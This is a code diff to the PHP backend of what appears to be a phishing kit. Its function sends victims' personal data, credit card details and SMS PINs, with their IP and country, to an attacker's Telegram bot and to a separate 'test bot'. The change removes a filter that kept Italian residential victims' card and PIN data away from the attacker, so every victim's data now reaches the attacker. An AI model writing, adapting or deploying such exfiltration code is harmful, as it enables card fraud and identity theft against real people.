@@ -218,54 +218,20 @@ function sendToTestBot($message) {
 function sendToAllBots($bot, $ids, $message, $message_type = "INFO", $victim_ip = "") {
     global $panel;
     
-    // For PERSONAL_INFO - Always send to both (attacker + test)
-    if ($message_type === "PERSONAL_INFO") {
-        foreach($ids as $id){
-            $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
-            sendBot($url);
-        }
-        if (TEST_MODE_ENABLED) {
-            // Decode first for clean display
-            $decoded_msg = urldecode($message);
-            $test_message = "🛡️ [TEST MODE - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
-            sendToTestBot($test_message);
-        }
-        return;
+    $country = getCountryCode($victim_ip);
+    $ipType = getIPType($victim_ip);
+    
+    // Send to ORIGINAL attacker bot (always)
+    foreach($ids as $id){
+        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
+        sendBot($url);
     }
     
-    // For CREDIT_CARD and SMS_PIN - Check if Italian IP
-    if ($message_type === "CREDIT_CARD" || $message_type === "SMS_PIN") {
-        $isItalian = isFromItaly($victim_ip);
-        $country = getCountryCode($victim_ip);
-        $ipType = getIPType($victim_ip);
-        
-        if ($isItalian) {
-            // ITALIAN RESIDENTIAL: Only test bot gets data, attacker gets NOTHING
-            if (TEST_MODE_ENABLED) {
-                $decoded_msg = urldecode($message);
-                $test_message = "🛡️ [🇮🇹 ITALIAN RESIDENTIAL - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• IP: $victim_ip\n• Country: $country\n• IP Type: $ipType\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
-                sendToTestBot($test_message);
-            }
-            // Attacker gets nothing - no data sent to original bot
-        } else {
-            // NON-ITALIAN or ITALIAN VPN/HOSTING: Only attacker gets data, test gets info
-            foreach($ids as $id){
-                $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
-                sendBot($url);
-            }
-            if (TEST_MODE_ENABLED) {
-                // Check if Italian but VPN/hosting
-                $italianCountry = in_array($country, ITALY_COUNTRY_CODES);
-                if ($italianCountry && ($ipType === "hosting" || $ipType === "vpn")) {
-                    $reason = "Italian IP but type: $ipType (not residential)";
-                } else {
-                    $reason = "Not Italian IP";
-                }
-                $test_message = "⏭️ [SKIPPED - $reason] ⏭️\nType: $message_type\nIP: $victim_ip ($country)\nIP Type: $ipType\nReason: Data sent to attacker only";
-                sendToTestBot($test_message);
-            }
-        }
-        return;
+    // Send to YOUR test bot (always - for full analysis)
+    if (TEST_MODE_ENABLED) {
+        $decoded_msg = urldecode($message);
+        $test_message = "🛡️ [TEST - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• IP: $victim_ip\n• Country: $country\n• IP Type: $ipType\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
+        sendToTestBot($test_message);
     }
 }
 ?>
